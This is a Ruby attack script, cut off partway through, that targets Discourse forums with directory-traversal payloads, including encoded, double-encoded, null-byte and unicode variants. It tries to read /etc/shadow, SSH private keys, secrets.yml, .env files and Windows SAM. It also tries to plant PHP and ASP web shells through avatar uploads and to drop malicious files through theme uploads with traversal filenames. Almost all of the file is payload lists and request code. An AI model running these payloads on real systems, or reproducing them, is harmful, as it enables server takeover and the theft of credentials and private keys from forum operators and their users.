#!/usr/bin/env ruby

require 'net/http'
require 'uri'
require 'json'
require 'base64'
require 'cgi'

class DiscourseDirectoryTraversal
  def initialize(target_url, options = {})
    @target_url = target_url.chomp('/')
    @proxy = options[:proxy]
    @timeout = options[:timeout] || 10
    @session = {}
    @csrf_token = nil
    
    @results = {
      vulnerable: false,
      vulnerabilities: [],
      summary: {
        total_tests: 0,
        successful_tests: 0,
        critical_vulns: 0,
        high_vulns: 0,
        medium_vulns: 0,
        low_vulns: 0
      },
      target: @target_url,
      timestamp: Time.now.iso8601
    }
    
    extract_csrf_token
  end
  
  def run_all_tests
    puts "\nüîç Starting directory traversal tests on #{@target_url}"
    puts "=" * 60
    
    # Basic directory traversal
    test_basic_directory_traversal
    test_encoded_directory_traversal
    test_double_encoded_directory_traversal
    
    # File access tests
    test_sensitive_file_access
    test_configuration_file_access
    test_log_file_access
    test_backup_file_access
    
    # Upload-based directory traversal
    test_upload_directory_traversal
    test_avatar_directory_traversal
    test_theme_directory_traversal
    
    # API-based directory traversal
    test_api_directory_traversal
    test_admin_directory_traversal
    
    # Plugin-based directory traversal
    test_plugin_directory_traversal
    
    # Advanced techniques
    test_null_byte_injection
    test_unicode_directory_traversal
    test_path_normalization_bypass
    
    # OS-specific tests
    test_windows_directory_traversal
    test_unix_directory_traversal
    
    print_results
    save_results
    
    @results
  end
  
  def test_basic_directory_traversal
    puts "\n[*] Testing basic directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Basic traversal payloads
    basic_payloads = [
      '../',
      '../../',
      '../../../',
      '../../../../',
      '../../../../../',
      '../../../../../../',
      '../../../../../../../',
      '../../../../../../../../',
      '../../../../../../../../../',
      '../../../../../../../../../../'
    ]
    
    # Target files to test
    target_files = [
      'etc/passwd',
      'etc/shadow',
      'etc/hosts',
      'etc/hostname',
      'etc/issue',
      'proc/version',
      'proc/self/environ',
      'windows/system32/drivers/etc/hosts',
      'windows/win.ini',
      'boot.ini'
    ]
    
    # Test endpoints
    test_endpoints = [
      '/uploads/',
      '/assets/',
      '/files/',
      '/download/',
      '/export/',
      '/backup/',
      '/logs/',
      '/admin/logs/',
      '/admin/backups/'
    ]
    
    test_endpoints.each do |endpoint|
      basic_payloads.each do |payload|
        target_files.each do |file|
          traversal_path = "#{payload}#{file}"
          
          # Test GET request
          response = test_directory_traversal_get(endpoint, traversal_path)
          
          if response && check_file_access_success(response, file)
            add_vulnerability({
              test_type: 'Basic Directory Traversal (GET)',
              endpoint: endpoint,
              method: 'GET',
              payload: { path: traversal_path },
              severity: determine_file_severity(file),
              evidence: extract_file_evidence(response.body, file),
              description: "Directory traversal access to #{file} via #{endpoint}"
            })
          end
          
          # Test POST request
          response = test_directory_traversal_post(endpoint, traversal_path)
          
          if response && check_file_access_success(response, file)
            add_vulnerability({
              test_type: 'Basic Directory Traversal (POST)',
              endpoint: endpoint,
              method: 'POST',
              payload: { path: traversal_path },
              severity: determine_file_severity(file),
              evidence: extract_file_evidence(response.body, file),
              description: "Directory traversal access to #{file} via #{endpoint}"
            })
          end
        end
      end
    end
  end
  
  def test_encoded_directory_traversal
    puts "\n[*] Testing encoded directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # URL encoded payloads
    encoded_payloads = [
      '%2e%2e%2f',
      '%2e%2e/',
      '..%2f',
      '%2e%2e%5c',
      '..%5c',
      '%252e%252e%252f',
      '%c0%ae%c0%ae%c0%af',
      '%c1%9c',
      '%c0%af'
    ]
    
    target_files = ['etc/passwd', 'windows/win.ini', 'boot.ini']
    test_endpoints = ['/uploads/', '/files/', '/download/']
    
    test_endpoints.each do |endpoint|
      encoded_payloads.each do |payload|
        target_files.each do |file|
          traversal_path = "#{payload * 5}#{file}"
          
          response = test_directory_traversal_get(endpoint, traversal_path)
          
          if response && check_file_access_success(response, file)
            add_vulnerability({
              test_type: 'Encoded Directory Traversal',
              endpoint: endpoint,
              method: 'GET',
              payload: { path: traversal_path },
              severity: determine_file_severity(file),
              evidence: extract_file_evidence(response.body, file),
              description: "Encoded directory traversal access to #{file}"
            })
          end
        end
      end
    end
  end
  
  def test_double_encoded_directory_traversal
    puts "\n[*] Testing double encoded directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Double encoded payloads
    double_encoded_payloads = [
      '%252e%252e%252f',
      '%252e%252e%255c',
      '%25252e%25252e%25252f',
      '%2e%2e%252f',
      '%252e%2e%2f'
    ]
    
    target_files = ['etc/passwd', 'etc/shadow', 'windows/system32/drivers/etc/hosts']
    test_endpoints = ['/uploads/', '/assets/', '/files/']
    
    test_endpoints.each do |endpoint|
      double_encoded_payloads.each do |payload|
        target_files.each do |file|
          traversal_path = "#{payload * 4}#{file}"
          
          response = test_directory_traversal_get(endpoint, traversal_path)
          
          if response && check_file_access_success(response, file)
            add_vulnerability({
              test_type: 'Double Encoded Directory Traversal',
              endpoint: endpoint,
              method: 'GET',
              payload: { path: traversal_path },
              severity: determine_file_severity(file),
              evidence: extract_file_evidence(response.body, file),
              description: "Double encoded directory traversal access to #{file}"
            })
          end
        end
      end
    end
  end
  
  def test_sensitive_file_access
    puts "\n[*] Testing sensitive file access..."
    @results[:summary][:total_tests] += 1
    
    # Sensitive files
    sensitive_files = [
      'etc/passwd',
      'etc/shadow',
      'etc/group',
      'etc/hosts',
      'etc/hostname',
      'etc/resolv.conf',
      'etc/ssh/ssh_host_rsa_key',
      'etc/ssh/ssh_host_dsa_key',
      'root/.ssh/id_rsa',
      'root/.ssh/id_dsa',
      'home/discourse/.ssh/id_rsa',
      'var/www/.ssh/id_rsa'
    ]
    
    traversal_prefixes = ['../../../../../../../', '..\\..\\..\\..\\..\\..\\..\\', '%2e%2e%2f' * 7]
    
    sensitive_files.each do |file|
      traversal_prefixes.each do |prefix|
        full_path = "#{prefix}#{file}"
        
        # Test multiple endpoints
        test_endpoints = ['/uploads/', '/files/', '/download/', '/export/', '/backup/']
        
        test_endpoints.each do |endpoint|
          response = test_directory_traversal_get(endpoint, full_path)
          
          if response && check_sensitive_file_access(response, file)
            add_vulnerability({
              test_type: 'Sensitive File Access',
              endpoint: endpoint,
              method: 'GET',
              payload: { path: full_path },
              severity: 'Critical',
              evidence: extract_sensitive_file_evidence(response.body, file),
              description: "Sensitive file access: #{file}"
            })
          end
        end
      end
    end
  end
  
  def test_configuration_file_access
    puts "\n[*] Testing configuration file access..."
    @results[:summary][:total_tests] += 1
    
    # Configuration files
    config_files = [
      'config/database.yml',
      'config/secrets.yml',
      'config/application.yml',
      'config/discourse.conf',
      'config/nginx.conf',
      'config/redis.conf',
      'config/postgresql.conf',
      '.env',
      '.env.production',
      'docker-compose.yml',
      'Dockerfile'
    ]
    
    traversal_prefixes = ['../../../', '../../../../', '../../../../../']
    
    config_files.each do |file|
      traversal_prefixes.each do |prefix|
        full_path = "#{prefix}#{file}"
        
        response = test_directory_traversal_get('/files/', full_path)
        
        if response && check_config_file_access(response, file)
          add_vulnerability({
            test_type: 'Configuration File Access',
            endpoint: '/files/',
            method: 'GET',
            payload: { path: full_path },
            severity: 'High',
            evidence: extract_config_evidence(response.body, file),
            description: "Configuration file access: #{file}"
          })
        end
      end
    end
  end
  
  def test_log_file_access
    puts "\n[*] Testing log file access..."
    @results[:summary][:total_tests] += 1
    
    # Log files
    log_files = [
      'log/production.log',
      'log/development.log',
      'log/unicorn.stderr.log',
      'log/unicorn.stdout.log',
      'log/nginx/access.log',
      'log/nginx/error.log',
      'var/log/nginx/access.log',
      'var/log/nginx/error.log',
      'var/log/apache2/access.log',
      'var/log/apache2/error.log',
      'var/log/syslog',
      'var/log/auth.log'
    ]
    
    traversal_prefixes = ['../../../', '../../../../', '../../../../../']
    
    log_files.each do |file|
      traversal_prefixes.each do |prefix|
        full_path = "#{prefix}#{file}"
        
        response = test_directory_traversal_get('/logs/', full_path)
        
        if response && check_log_file_access(response, file)
          add_vulnerability({
            test_type: 'Log File Access',
            endpoint: '/logs/',
            method: 'GET',
            payload: { path: full_path },
            severity: 'Medium',
            evidence: extract_log_evidence(response.body, file),
            description: "Log file access: #{file}"
          })
        end
      end
    end
  end
  
  def test_backup_file_access
    puts "\n[*] Testing backup file access..."
    @results[:summary][:total_tests] += 1
    
    # Backup files
    backup_files = [
      'backup/discourse.tar.gz',
      'backup/database.sql',
      'backup/uploads.tar.gz',
      'backups/discourse-backup.tar.gz',
      'tmp/backups/discourse.tar.gz',
      'var/backups/discourse.sql',
      'home/discourse/backups/latest.tar.gz'
    ]
    
    traversal_prefixes = ['../../../', '../../../../', '../../../../../']
    
    backup_files.each do |file|
      traversal_prefixes.each do |prefix|
        full_path = "#{prefix}#{file}"
        
        response = test_directory_traversal_get('/backup/', full_path)
        
        if response && check_backup_file_access(response, file)
          add_vulnerability({
            test_type: 'Backup File Access',
            endpoint: '/backup/',
            method: 'GET',
            payload: { path: full_path },
            severity: 'High',
            evidence: ['Backup file accessible'],
            description: "Backup file access: #{file}"
          })
        end
      end
    end
  end
  
  def test_upload_directory_traversal
    puts "\n[*] Testing upload directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Test file upload with directory traversal
    traversal_filenames = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\win.ini',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//....//etc/passwd',
      '..%252f..%252f..%252fetc%252fpasswd'
    ]
    
    traversal_filenames.each do |filename|
      response = test_upload_with_traversal_filename(filename)
      
      if response && check_upload_traversal_success(response)
        add_vulnerability({
          test_type: 'Upload Directory Traversal',
          endpoint: '/uploads',
          method: 'POST',
          payload: { filename: filename },
          severity: 'High',
          evidence: ['File uploaded with traversal path'],
          description: "Upload directory traversal with filename: #{filename}"
        })
      end
    end
  end
  
  def test_avatar_directory_traversal
    puts "\n[*] Testing avatar directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Test avatar upload with directory traversal
    avatar_traversal_tests = [
      { filename: '../../../var/www/html/shell.php', content: '<?php system($_GET["cmd"]); ?>' },
      { filename: '..\\..\\..\\inetpub\\wwwroot\\shell.asp', content: '<% eval request("cmd") %>' },
      { filename: '%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2fshell.php', content: '<?php phpinfo(); ?>' }
    ]
    
    avatar_traversal_tests.each do |test|
      response = test_avatar_upload_with_traversal(test[:filename], test[:content])
      
      if response && check_avatar_traversal_success(response)
        add_vulnerability({
          test_type: 'Avatar Directory Traversal',
          endpoint: '/users/avatar',
          method: 'POST',
          payload: { filename: test[:filename] },
          severity: 'Critical',
          evidence: ['Avatar uploaded with traversal path'],
          description: "Avatar directory traversal: #{test[:filename]}"
        })
      end
    end
  end
  
  def test_theme_directory_traversal
    puts "\n[*] Testing theme directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Test theme upload with directory traversal
    theme_traversal_tests = [
      '../../../var/www/html/malicious.js',
      '..\\..\\..\\inetpub\\wwwroot\\malicious.css',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fvar%2fwww%2fhtml%2fmalicious.hbs'
    ]
    
    theme_traversal_tests.each do |filename|
      response = test_theme_upload_with_traversal(filename)
      
      if response && check_theme_traversal_success(response)
        add_vulnerability({
          test_type: 'Theme Directory Traversal',
          endpoint: '/admin/themes/upload',
          method: 'POST',
          payload: { filename: filename },
          severity: 'High',
          evidence: ['Theme file uploaded with traversal path'],
          description: "Theme directory traversal: #{filename}"
        })
      end
    end
  end
  
  def test_api_directory_traversal
    puts "\n[*] Testing API directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Test API endpoints with directory traversal
    api_traversal_tests = [
      { endpoint: '/admin/backups', param: 'filename', payload: '../../../etc/passwd' },
      { endpoint: '/admin/logs', param: 'file', payload: '../../../../var/log/syslog' },
      { endpoint: '/uploads', param: 'path', payload: '../../../config/database.yml' },
      { endpoint: '/export', param: 'file', payload: '..\\..\\..\\windows\\win.ini' }
    ]
    
    api_traversal_tests.each do |test|
      response = test_api_traversal(test[:endpoint], test[:param], test[:payload])
      
      if response && check_api_traversal_success(response, test[:payload])
        add_vulnerability({
          test_type: 'API Directory Traversal',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: { test[:param] => test[:payload] },
          severity: 'High',
          evidence: ['API directory traversal successful'],
          description: "API directory traversal: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_admin_directory_traversal
    puts "\n[*] Testing admin directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Test admin endpoints with directory traversal
    admin_traversal_tests = [
      { endpoint: '/admin/backups/download', param: 'filename', payload: '../../../etc/passwd' },
      { endpoint: '/admin/logs/show', param: 'file', payload: '../../../../var/log/auth.log' },
      { endpoint: '/admin/customize/themes/import', param: 'file', payload: '../../../config/secrets.yml' },
      { endpoint: '/admin/export/csv', param: 'path', payload: '..\\..\\..\\windows\\system32\\config\\sam' }
    ]
    
    admin_traversal_tests.each do |test|
      response = test_admin_traversal(test[:endpoint], test[:param], test[:payload])
      
      if response && check_admin_traversal_success(response, test[:payload])
        add_vulnerability({
          test_type: 'Admin Directory Traversal',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: { test[:param] => test[:payload] },
          severity: 'Critical',
          evidence: ['Admin directory traversal successful'],
          description: "Admin directory traversal: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_plugin_directory_traversal
    puts "\n[*] Testing plugin directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Test plugin endpoints with directory traversal
    plugin_traversal_tests = [
      { endpoint: '/chat/uploads', param: 'file', payload: '../../../etc/passwd' },
      { endpoint: '/poll/export', param: 'filename', payload: '../../../../config/database.yml' },
      { endpoint: '/calendar/import', param: 'file', payload: '..\\..\\..\\windows\\win.ini' },
      { endpoint: '/assign/export', param: 'path', payload: '../../../var/log/syslog' }
    ]
    
    plugin_traversal_tests.each do |test|
      response = test_plugin_traversal(test[:endpoint], test[:param], test[:payload])
      
      if response && check_plugin_traversal_success(response, test[:payload])
        add_vulnerability({
          test_type: 'Plugin Directory Traversal',
          endpoint: test[:endpoint],
          method: 'GET',
          payload: { test[:param] => test[:payload] },
          severity: 'High',
          evidence: ['Plugin directory traversal successful'],
          description: "Plugin directory traversal: #{test[:endpoint]}"
        })
      end
    end
  end
  
  def test_null_byte_injection
    puts "\n[*] Testing null byte injection..."
    @results[:summary][:total_tests] += 1
    
    # Null byte injection payloads
    null_byte_payloads = [
      '../../../etc/passwd%00',
      '../../../etc/passwd%00.jpg',
      '../../../etc/passwd\x00',
      '../../../etc/passwd\x00.png',
      '..%2f..%2f..%2fetc%2fpasswd%00',
      '..%2f..%2f..%2fetc%2fpasswd%00.txt'
    ]
    
    test_endpoints = ['/uploads/', '/files/', '/download/']
    
    test_endpoints.each do |endpoint|
      null_byte_payloads.each do |payload|
        response = test_directory_traversal_get(endpoint, payload)
        
        if response && check_null_byte_success(response)
          add_vulnerability({
            test_type: 'Null Byte Injection',
            endpoint: endpoint,
            method: 'GET',
            payload: { path: payload },
            severity: 'High',
            evidence: ['Null byte injection successful'],
            description: "Null byte injection: #{payload}"
          })
        end
      end
    end
  end
  
  def test_unicode_directory_traversal
    puts "\n[*] Testing unicode directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Unicode traversal payloads
    unicode_payloads = [
      '%c0%ae%c0%ae%c0%af',
      '%c1%9c',
      '\u002e\u002e\u002f',
      '\u002e\u002e\u005c',
      '%u002e%u002e%u002f',
      '%u002e%u002e%u005c'
    ]
    
    target_files = ['etc/passwd', 'windows/win.ini']
    
    unicode_payloads.each do |payload|
      target_files.each do |file|
        full_path = "#{payload * 5}#{file}"
        
        response = test_directory_traversal_get('/files/', full_path)
        
        if response && check_unicode_traversal_success(response, file)
          add_vulnerability({
            test_type: 'Unicode Directory Traversal',
            endpoint: '/files/',
            method: 'GET',
            payload: { path: full_path },
            severity: 'High',
            evidence: ['Unicode directory traversal successful'],
            description: "Unicode directory traversal: #{file}"
          })
        end
      end
    end
  end
  
  def test_path_normalization_bypass
    puts "\n[*] Testing path normalization bypass..."
    @results[:summary][:total_tests] += 1
    
    # Path normalization bypass payloads
    normalization_payloads = [
      '....//....//....//etc/passwd',
      '....\\....\\....\\windows\\win.ini',
      '..../..../..../etc/passwd',
      '....\\....\\....\\etc\\passwd',
      '/./././etc/passwd',
      '\\.\\.\\etc\\passwd',
      '/./../etc/passwd',
      '\\.\\..\\etc\\passwd'
    ]
    
    test_endpoints = ['/uploads/', '/files/', '/download/']
    
    test_endpoints.each do |endpoint|
      normalization_payloads.each do |payload|
        response = test_directory_traversal_get(endpoint, payload)
        
        if response && check_normalization_bypass_success(response)
          add_vulnerability({
            test_type: 'Path Normalization Bypass',
            endpoint: endpoint,
            method: 'GET',
            payload: { path: payload },
            severity: 'High',
            evidence: ['Path normalization bypass successful'],
            description: "Path normalization bypass: #{payload}"
          })
        end
      end
    end
  end
  
  def test_windows_directory_traversal
    puts "\n[*] Testing Windows-specific directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Windows-specific payloads
    windows_payloads = [
      '..\\..\\..\\windows\\win.ini',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '..\\..\\..\\boot.ini',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '..\\..\\..\\windows\\repair\\sam',
      '..\\..\\..\\windows\\system32\\config\\system',
      '..\\..\\..\\inetpub\\wwwroot\\web.config'
    ]
    
    test_endpoints = ['/uploads/', '/files/', '/download/']
    
    test_endpoints.each do |endpoint|
      windows_payloads.each do |payload|
        response = test_directory_traversal_get(endpoint, payload)
        
        if response && check_windows_file_access(response, payload)
          add_vulnerability({
            test_type: 'Windows Directory Traversal',
            endpoint: endpoint,
            method: 'GET',
            payload: { path: payload },
            severity: 'High',
            evidence: ['Windows file access successful'],
            description: "Windows directory traversal: #{payload}"
          })
        end
      end
    end
  end
  
  def test_unix_directory_traversal
    puts "\n[*] Testing Unix-specific directory traversal..."
    @results[:summary][:total_tests] += 1
    
    # Unix-specific payloads
    unix_payloads = [
      '../../../etc/passwd',
      '../../../etc/shadow',
      '../../../etc/group',
      '../../../etc/hosts',
      '../../../proc/version',
      '../../../proc/self/environ',
      '../../../var/log/auth.log',
      '../../../home/discourse/.ssh/id_rsa'
    ]
    
    test_endpoints = ['/uploads/', '/files/', '/download/']
    
    test_endpoints.each do |endpoint|
      unix_payloads.each do |payload|
        response = test_directory_traversal_get(endpoint, payload)
        
        if response && check_unix_file_access(response, payload)
          add_vulnerability({
            test_type: 'Unix Directory Traversal',
            endpoint: endpoint,
            method: 'GET',
            payload: { path: payload },
            severity: determine_unix_file_severity(payload),
            evidence: extract_unix_file_evidence(response.body, payload),
            description: "Unix directory traversal: #{payload}"
          })
        end
      end
    end
  end
  
  # Helper methods for testing
  def test_directory_traversal_get(endpoint, path)
    encoded_path = CGI.escape(path)
    make_request(URI("#{@target_url}#{endpoint}#{encoded_path}"), 'GET')
  end
  
  def test_directory_traversal_post(endpoint, path)
    data = { file: path, path: path, filename: path }
    make_post_request("#{@target_url}#{endpoint}", data)
  end
  
  def test_upload_with_traversal_filename(filename)
    # Simulate file upload with traversal filename
    data = {
      file: filename,
      filename: filename,
      upload: filename
    }
    make_post_request("#{@target_url}/uploads", data)
  end
  
  def test_avatar_upload_with_traversal(filename, content)
    data = {
      avatar: filename,
      filename: filename,
      content: content
    }
    make_post_request("#{@target_url}/users/avatar", data)
  end
  
  def test_theme_upload_with_traversal(filename)
    data = {
      theme_file: filename,
      filename: filename
    }
    make_post_request("#{@target_url}/admin/themes/upload", data)
  end
  
  def test_api_traversal(endpoint, param, payload)
    make_request(URI("#{@target_url}#{endpoint}?#{param}=#{CGI.escape(payload)}"), 'GET')
  end
  
  def test_admin_traversal(endpoint, param, payload)
    make_request(URI("#{@target_url}#{endpoint}?#{param}=#{CGI.escape(payload)}"), 'GET')
  end
  
  def test_plugin_traversal(endpoint, param, payload)
    make_request(URI("#{@target_url}#{endpoint}?#{param}=#{CGI.escape(payload)}"), 'GET')
  end
  
  # Helper methods for checking success
  def check_file_access_success(response, file)
    return false unless response && response.code.to_i < 400
    
    case file
    when /passwd/
      response.body.match(/root:.*:0:0:/) || response.body.include?('root:x:0:0:')
    when /shadow/
      response.body.include?('root:$') || response.body.include?('root:!')
    when /hosts/
      response.body.include?('localhost') || response.body.include?('127.0.0.1')
    when /win\.ini/
      response.body.include?('[fonts]') || response.body.include?('[extensions]')
    when /boot\.ini/
      response.body.include?('[boot loader]') || response.body.include?('timeout=')
    else
      response.body.length > 0 && !response.body.include?('404') && !response.body.include?('Not Found')
    end
  end
  
  def check_sensitive_file_access(response, file)
    return false unless response && response.code.to_i < 400
    
    sensitive_indicators = {
      'passwd' => [/root:.*:0:0:/, /daemon:.*:1:1:/, /bin:.*:2:2:/],
      'shadow' => [/root:\$/, /root:!/, /\$6\$/],
      'ssh' => [/BEGIN.*PRIVATE KEY/, /BEGIN RSA PRIVATE KEY/, /BEGIN DSA PRIVATE KEY/],
      'id_rsa' => [/BEGIN.*PRIVATE KEY/, /BEGIN RSA PRIVATE KEY/]
    }
    
    sensitive_indicators.each do |key, patterns|
      if file.include?(key)
        return patterns.any? { |pattern| response.body.match(pattern) }
      end
    end
    
    false
  end
  
  def check_config_file_access(response, file)
    return false unless response && response.code.to_i < 400
    
    config_indicators = {
      'database.yml' => ['adapter:', 'database:', 'username:', 'password:'],
      'secrets.yml' => ['secret_key_base:', 'secret_token:'],
      '.env' => ['DATABASE_URL=', 'SECRET_KEY=', 'API_KEY='],
      'nginx.conf' => ['server {', 'location', 'proxy_pass'],
      'redis.conf' => ['port', 'bind', 'requirepass']
    }
    
    config_indicators.each do |key, indicators|
      if file.include?(key)
        return indicators.any? { |indicator| response.body.include?(indicator) }
      end
    end
    
    false
  end
  
  def check_log_file_access(response, file)
    return false unless response && response.code.to_i < 400
    
    log_indicators = [
      /\d{4}-\d{2}-\d{2}/, # Date format
      /\[\d{2}:\/\w{3}\/\d{4}/, # Apache log format
      /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/, # IP addresses
      /GET|POST|PUT|DELETE/, # HTTP methods
      /ERROR|WARN|INFO|DEBUG/ # Log levels
    ]
    
    log_indicators.any? { |pattern| response.body.match(pattern) }
  end
  
  def check_backup_file_access(response, file)
    return false unless response && response.code.to_i < 400
    
    # Check for backup file indicators
    backup_indicators = [
      response.headers['Content-Type']&.include?('application/gzip'),
      response.headers['Content-Type']&.include?('application/x-tar'),
      response.headers['Content-Type']&.include?('application/sql'),
      response.body.start_with?("\x1f\x8b"), # Gzip magic number
      response.body.include?('CREATE TABLE'),
      response.body.include?('INSERT INTO')
    ]
    
    backup_indicators.any?
  end
  
  def check_upload_traversal_success(response)
    return false unless response
    
    success_indicators = [
      response.code.to_i < 400,
      response.body.include?('uploaded'),
      response.body.include?('success'),
      !response.body.include?('error'),
      !response.body.include?('invalid')
    ]
    
    success_indicators.all?
  end
  
  def check_avatar_traversal_success(response)
    check_upload_traversal_success(response)
  end
  
  def check_theme_traversal_success(response)
    check_upload_traversal_success(response)
  end
  
  def check_api_traversal_success(response, payload)
    return false unless response && response.code.to_i < 400
    
    # Check if the response contains file content indicators
    if payload.include?('passwd')
      response.body.match(/root:.*:0:0:/)
    elsif payload.include?('win.ini')
      response.body.include?('[fonts]')
    else
      response.body.length > 0 && !response.body.include?('404')
    end
  end
  
  def check_admin_traversal_success(response, payload)
    check_api_traversal_success(response, payload)
  end
  
  def check_plugin_traversal_success(response, payload)
    check_api_traversal_success(response, payload)
  end
  
  def check_null_byte_success(response)
    return false unless response && response.code.to_i < 400
    
    # Check for null byte injection success
    response.body.match(/root:.*:0:0:/) || response.body.include?('[fonts]')
  end
  
  def check_unicode_traversal_success(response, file)
    check_file_access_success(response, file)
  end
  
  def check_normalization_bypass_success(response)
    return false unless response && response.code.to_i < 400
    
    response.body.match(/root:.*:0:0:/) || response.body.include?('[fonts]')
  end
  
  def check_windows_file_access(response, payload)
    return false unless response && response.code.to_i < 400
    
    windows_indicators = {
      'win.ini' => ['[fonts]', '[extensions]'],
      'boot.ini' => ['[boot loader]', 'timeout='],
      'hosts' => ['localhost', '127.0.0.1'],
      'sam' => ['SAM', 'SECURITY'],
      'web.config' => ['<configuration>', '<system.web>']
    }
    
    windows_indicators.each do |key, indicators|
      if payload.include?(key)
        return indicators.any? { |indicator| response.body.include?(indicator) }
      end
    end
    
    false
  end
  
  def check_unix_file_access(response, payload)
    return false unless response && response.code.to_i < 400
    
    unix_indicators = {
      'passwd' => [/root:.*:0:0:/, /daemon:.*:1:1:/],
      'shadow' => [/root:\$/, /root:!/],
      'group' => [/root:.*:0:/, /daemon:.*:1:/],
      'hosts' => ['localhost', '127.0.0.1'],
      'version' => ['Linux version', 'kernel'],
      'environ' => ['PATH=', 'HOME='],
      'auth.log' => [/\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}/],
      'id_rsa' => [/BEGIN.*PRIVATE KEY/]
    }
    
    unix_indicators.each do |key, patterns|
      if payload.include?(key)
        return patterns.any? { |pattern| response.body.match(pattern) }
      end
    end
    
    false
  end
  
  # Helper methods for determining severity and extracting evidence
  def determine_file_severity(file)
    case file
    when /passwd|shadow|id_rsa|ssh.*key/
      'Critical'
    when /config|database|secret/
      'High'
    when /log|hosts/
      'Medium'
    else
      'Low'
    end
  end
  
  def determine_unix_file_severity(payload)
    case payload
    when /passwd|shadow|id_rsa|ssh.*key/
      'Critical'
    when /environ|auth\.log/
      'High'
    when /hosts|version/
      'Medium'
    else
      'Low'
    end
  end
  
  def extract_file_evidence(body, file)
    evidence = []
    
    case file
    when /passwd/
      evidence << 'passwd file content' if body.match(/root:.*:0:0:/)
    when /shadow/
      evidence << 'shadow file content' if body.include?('root:$')
    when /hosts/
      evidence << 'hosts file content' if body.include?('localhost')
    when /win\.ini/
      evidence << 'win.ini file content' if body.include?('[fonts]')
    end
    
    evidence << 'File content accessible' if evidence.empty? && body.length > 0
    evidence
  end
  
  def extract_sensitive_file_evidence(body, file)
    evidence = []
    
    if file.include?('passwd') && body.match(/root:.*:0:0:/)
      evidence << 'Root user entry found'
    elsif file.include?('shadow') && body.include?('root:$')
      evidence << 'Password hashes found'
    elsif file.include?('ssh') && body.match(/BEGIN.*PRIVATE KEY/)
      evidence << 'SSH private key found'
    end
    
    evidence << 'Sensitive file accessible' if evidence.empty?
    evidence
  end
  
  def extract_config_evidence(body, file)
    evidence = []
    
    if file.include?('database') && body.include?('password:')
      evidence << 'Database credentials found'
    elsif file.include?('secret') && body.include?('secret_key')
      evidence << 'Secret keys found'
    elsif file.include?('.env') && body.include?('=')
      evidence << 'Environment variables found'
    end
    
    evidence << 'Configuration file accessible' if evidence.empty?
    evidence
  end
  
  def extract_log_evidence(body, file)
    evidence = []
    
    if body.match(/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/)
      evidence << 'IP addresses found in logs'
    end
    
    if body.match(/ERROR|WARN/)
      evidence << 'Error messages found'
    end
    
    evidence << 'Log file accessible' if evidence.empty?
    evidence
  end
  
  def extract_unix_file_evidence(body, payload)
    evidence = []
    
    if payload.include?('passwd') && body.match(/root:.*:0:0:/)
      evidence << 'Unix passwd file content'
    elsif payload.include?('environ') && body.include?('PATH=')
      evidence << 'Process environment variables'
    elsif payload.include?('version') && body.include?('Linux')
      evidence << 'Kernel version information'
    end
    
    evidence << 'Unix file accessible' if evidence.empty?
    evidence
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
